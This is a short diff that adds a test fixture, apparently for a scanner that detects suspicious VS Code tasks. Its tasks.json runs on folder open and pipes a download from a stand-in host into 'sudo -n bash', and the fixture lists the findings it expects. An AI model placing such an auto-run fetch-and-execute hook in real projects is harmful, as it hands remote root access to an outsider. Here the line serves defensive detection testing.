@@ -1,0 +1,14 @@
+# A download piped to sudo -n bash, where -n takes no value
+want: editor-task-command suspicious-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "curl -s https://x.example/a | sudo -n bash",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
